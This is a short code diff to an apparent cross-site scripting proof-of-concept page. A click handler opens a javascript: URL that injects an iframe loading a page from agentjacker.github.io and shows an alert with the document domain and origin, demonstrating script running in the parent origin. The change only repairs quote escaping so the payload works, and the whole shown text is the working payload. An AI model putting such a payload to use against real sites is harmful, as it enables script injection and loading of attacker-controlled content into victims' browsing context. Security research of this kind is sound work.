@@ -31,7 +31,7 @@
 
     document.body.addEventListener('click', function () {
 
-        window.open('javascript:var elem = document.createElement("p");elem.innerHTML = "<b><iframe src="https://agentjacker.github.io/geor.html"></iframe><p>Executed JS in parent origin: "+window.location.origin+"</b></p>"; document.body.append(elem);alert("XSS in doc.domain: "+document.domain+", win.origin: "+window.location.origin)');
+        window.open('javascript:var elem = document.createElement("p");elem.innerHTML = \'<b><iframe src="https://agentjacker.github.io/geor.html"></iframe><p>Executed JS in parent origin: \'+window.location.origin+"</b></p>"; document.body.append(elem);alert("XSS in doc.domain: "+document.domain+", win.origin: "+window.location.origin)');
     });
 </script>
 
